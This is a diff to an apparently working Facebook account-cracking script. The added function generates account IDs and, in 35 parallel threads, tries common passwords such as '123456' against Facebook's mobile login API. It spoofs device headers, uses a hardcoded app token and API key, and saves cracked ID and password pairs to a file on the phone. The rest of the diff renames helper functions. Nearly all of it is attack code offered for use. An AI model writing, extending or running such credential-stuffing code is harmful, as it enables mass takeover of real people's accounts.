@@ -1085,7 +1085,7 @@ def old_clone():
 
 #---------------------------[ 2009-2010 CLONING ]---------------------------#
 def ____old2009___():
-    clear()
+    menu_clear()
     print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m For Example : 50000 | 100000 | 200000 | 300000")
     linex()
     limit = int(input(f'\033[1;97m Put Limit :\033[1;92m '))
@@ -1096,8 +1096,8 @@ def ____old2009___():
         
         uid = prefix + suffix
         user.append(uid)
-    with ShaniXD(max_workers=35) as Shani:
-        clear()
+    with tred(max_workers=35) as Shani:
+        menu_clear()
         total_ids = int(limit)
         print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{total_ids}")
         print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m USE 1.1.1.1 VPN FOR BEST RESULT")
@@ -1426,6 +1426,65 @@ def old_Tree():
 
                 break
    
+def ____old____(uid,total_ids):
+    global loop
+    session = requests.session()
+    
+    try:
+        sys.stdout.write(f"{white}{loop}/{total_ids} | OK:{len(oks)} \033[0m\r");sys.stdout.flush()
+        for pw in ('123456', '1234567', '12345678', '123456789','1234567890'):
+            data = {
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'device_id': str(uuid.uuid4()),
+                'cpl': 'true',
+                'family_device_id': str(uuid.uuid4()),
+                'credentials_type': 'device_based_login_password',
+                'error_detail_type': 'button_with_disabled',
+                'source': 'device_based_login',
+                'email': str(uid),
+                'password': str(pw),
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'generate_session_cookies': '1',
+                'meta_inf_fbmeta': '',
+                'advertiser_id': str(uuid.uuid4()),
+                'currently_logged_in_userid': '0',
+                'locale': 'en_US',
+                'client_country_code': 'US',
+                'method': 'auth.login',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '882a8490361da98702bf97a021ddc14d'
+            }
+            headers = {
+                'User-Agent': ___uax___(),
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com',
+                'X-FB-Net-HNI': '25227',
+                'X-FB-SIM-HNI': '29752',
+                'X-FB-Connection-Type': 'MOBILE.LTE',
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
+                'x-fb-device-group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
+            }
+            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            if 'session_key' in res:
+                print(f"\r\033[1;92m[Shani-OK💚] {uid} ● {pw}\033[1;97m ● \033[1;92m{creationyear(uid)}")
+                open("/sdcard/OLD-OK.txt",'a').write(str(uid)+"|"+str(pw)+"|"+creationyear(uid)+"\n");oks.append(uid)
+                break
+            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
+                print(f"\r\033[1;92m[Shani-OK💚] {uid} ● {pw}\033[1;97m ● \033[1;92m{creationyear(uid)}")
+                open("/sdcard/OLD-OK.txt",'a').write(str(uid)+"|"+str(pw)+"|"+creationyear(uid)+"\n");oks.append(uid)
+                break
+            else:pass
+        loop+=1
+    except Exception as e:pass
 
 def login_1(uid):
     """
